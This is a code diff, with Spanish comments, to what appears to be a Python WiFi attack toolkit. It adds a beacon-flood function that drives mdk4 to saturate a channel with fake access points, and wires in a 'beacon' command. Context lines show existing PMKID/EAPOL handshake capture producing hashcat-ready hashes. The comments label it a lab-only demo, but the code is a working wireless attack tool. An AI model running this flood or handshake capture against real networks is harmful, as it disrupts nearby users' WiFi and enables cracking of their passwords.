@@ -366,6 +366,39 @@ def pmkid_capture(bssid, channel, iface, seconds=30):
     return data, None
 
 
+def _mdk4_path():
+    for p in ("/usr/sbin/mdk4", "/usr/bin/mdk4"):
+        if os.path.exists(p):
+            return p
+    return "/usr/sbin/mdk4"
+
+def beacon_flood(iface, channel=6, seconds=20, pps=80):
+    """Beacon flood con mdk4 (modo 'b'): inunda el aire con APs falsos de SSID
+    aleatorio durante `seconds`. Demo de ruido / saturacion de listas WiFi
+    (SOLO laboratorio). mdk4 necesita la interfaz en MONITOR (no la setea el
+    solo), por eso reset->monitor->flood->managed como el resto. El ataque es
+    continuo; lo acotamos con `timeout` (mdk4 sale por SIGTERM, returncode != 0
+    es ESPERADO, no un error)."""
+    ok = enable_monitor(iface)
+    if not ok:
+        return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"
+
+    # Canal fijo para que el flood sea visible en ese canal (mdk4 -c tambien lo
+    # fija; lo seteamos antes por las dudas). No critico si falla.
+    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
+    time.sleep(0.5)
+
+    mdk4 = _mdk4_path()
+    r = _run(['sudo', '/usr/bin/timeout', str(seconds),
+              mdk4, iface, 'b', '-c', str(channel), '-s', str(pps)],
+             timeout=seconds + 8)
+    out = ((r.stdout or '') + (r.stderr or '')) if r else ''
+
+    disable_monitor(iface)
+    return {"seconds": seconds, "channel": channel, "pps": pps,
+            "detail": out[-400:]}, None
+
+
 # OUI -> fabricante. Los primeros 3 bytes del MAC identifican al fabricante.
 # Preferimos una base del sistema si existe (completa); si no, un fallback chico.
 _OUI_BUILTIN = {
@@ -730,6 +763,20 @@ def main():
             got = data["pmkid_target"] or data["eapol_target"]
             log_attack("pmkid", bssid, "success" if got else "nada",
                        details=f"hashes={data['hashes']} pmkid={data['pmkid_target']} eapol={data['eapol_target']} hc={data['hc22000']}")
+            out = {"ok": True}
+            out.update(data)
+            print(json.dumps(out))
+    elif cmd == 'beacon':
+        channel = int(sys.argv[2]) if len(sys.argv) > 2 else 6
+        seconds = int(sys.argv[3]) if len(sys.argv) > 3 else 20
+        iface_b = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
+        data, err = beacon_flood(iface_b, channel, seconds)
+        if err:
+            log_attack("beacon", "", "fail", details=err)
+            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_b)}))
+        else:
+            log_attack("beacon", "", "done",
+                       details=f"ch={data['channel']} {data['seconds']}s {data['pps']}pps")
             out = {"ok": True}
             out.update(data)
             print(json.dumps(out))
